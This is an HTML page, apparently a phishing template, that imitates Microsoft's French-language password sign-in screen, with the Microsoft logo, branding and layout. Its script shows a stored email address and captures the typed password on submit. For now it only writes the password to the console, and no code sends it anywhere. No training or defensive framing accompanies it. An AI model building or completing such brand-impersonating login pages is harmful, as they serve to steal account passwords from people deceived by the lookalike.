<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrer le mot de passe</title>
    <style>
        /* تصفير الإعدادات وضمان ملء الشاشة بشكل مرن */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', -apple-system, Roboto, Helvetica, sans-serif;
        }

        /* الهيكل الأساسي يعتمد على Flexbox لترتيب الصندوق والتذييل عمودياً */
        body {
            background: radial-gradient(circle at 80% 20%, #e5eef9 0%, #f3f5f8 50%, #eddfe9 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between; /* يضمن بقاء الصندوق في المنتصف والتذييل في الأسفل دائماً */
            align-items: center;
            padding: 20px;
        }

        /* حاوية فارغة علوية للمساعدة في موازنة الصندوق في المنتصف تماماً */
        .spacer {
            flex: 1;
        }

        .container {
            width: 100%;
            max-width: 440px;
            display: flex;
            justify-content: center;
        }

        /* الصندوق الأبيض يتمدد تلقائياً ويحتوي كل شيء داخله بحزم */
        .login-container {
            background: #ffffff;
            width: 100%;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            display: flex;
            flex-direction: column;
        }

        .header-section {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .back-arrow {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            margin-right: 12px;
            cursor: pointer;
            text-decoration: none;
        }

        .back-arrow:hover {
            background-color: rgba(0, 0, 0, 0.08);
        }

        .logo-wrapper {
            display: flex;
            align-items: center;
        }

        .microsoft-squares {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 2px;
            width: 21px;
            height: 21px;
            margin-right: 12px;
        }

        .microsoft-squares span { display: block; }
        .r { background-color: #f25022; } 
        .g { background-color: #7fba00; } 
        .b { background-color: #00a4ef; } 
        .y { background-color: #ffb900; }

        .brand {
            font-size: 16px;
            font-weight: 600;
            color: #737373;
        }

        .account-display {
            font-size: 15px;
            color: #1b1b1b;
            margin-bottom: 12px;
        }

        h2 {
            color: #1b1b1b;
            font-size: 24px;
            font-weight: 600;
            margin: 0 0 20px 0;
        }

        .field-group {
            margin-bottom: 18px;
            width: 100%;
        }

        input[type="password"] {
            width: 100%;
            padding: 6px 0;
            font-size: 15px;
            border: none;
            border-bottom: 1px solid #666666;
            outline: none;
        }

        input[type="password"]:focus {
            border-bottom: 2px solid #0067b8;
        }

        .link-item {
            font-size: 13px;
            margin-bottom: 14px;
        }

        .link-item a {
            color: #0067b8;
            text-decoration: none;
        }

        .link-item a:hover { 
            text-decoration: underline; 
        }

        .actions-wrapper {
            display: flex;
            justify-content: flex-end;
            margin-top: 24px;
        }

        .submit-btn {
            background-color: #0067b8;
            color: #ffffff;
            border: none;
            padding: 6px 20px;
            min-width: 108px;
            font-size: 15px;
            cursor: pointer;
        }

        .submit-btn:hover { 
            background-color: #005da6; 
        }

        /* التذييل للموازنة السفلية */
        .footer-spacer {
            flex: 1;
            display: flex;
            align-items: flex-end;
            justify-content: flex-end;
            width: 100%;
            max-width: 100%;
        }

        footer {
            width: 100%;
            display: flex;
            justify-content: flex-end;
            gap: 16px;
            padding-top: 20px;
        }

        footer a {
            color: #000000;
            font-size: 11px;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="spacer"></div>

    <div class="container">
        <div class="login-container">
            
            <div class="header-section">
                <a href="index.html" class="back-arrow" aria-label="Retour">
                    <svg viewBox="0 0 24 24" width="20" height="20">
                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="#1b1b1b"/>
                    </svg>
                </a>
                <div class="logo-wrapper">
                    <div class="microsoft-squares">
                        <span class="r"></span><span class="g"></span>
                        <span class="b"></span><span class="y"></span>
                    </div>
                    <span class="brand">Microsoft</span>
                </div>
            </div>

            <div class="account-display">
                <span id="display-email"></span>
            </div>

            <h2>Entrer le mot de passe</h2>

            <form id="form-password">
                <div class="field-group">
                    <input type="password" id="password" placeholder="Mot de passe" required autocomplete="off">
                </div>
                <div class="link-item"><a href="#">Mot de passe oublié ?</a></div>
                <div class="link-item"><a href="#">Se connecter d'une autre manière</a></div>
                
                <div class="actions-wrapper">
                    <button type="submit" class="submit-btn">Se connecter</button>
                </div>
            </form>

        </div>
    </div>

    <div class="footer-spacer">
        <footer>
            <a href="#">Conditions d'utilisation</a>
            <a href="#">Confidentialité et cookies</a>
        </footer>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const savedEmail = localStorage.getItem('user_email') || 'ayoub123@gmail.com';
            document.getElementById('display-email').textContent = savedEmail;
            document.getElementById('password').focus();
        });

        document.getElementById('form-password').addEventListener('submit', function(e) {
            e.preventDefault();
            const passwordValue = document.getElementById('password').value;
            console.log('Mot de passe:', passwordValue);
        });
    </script>
</body>
</html>
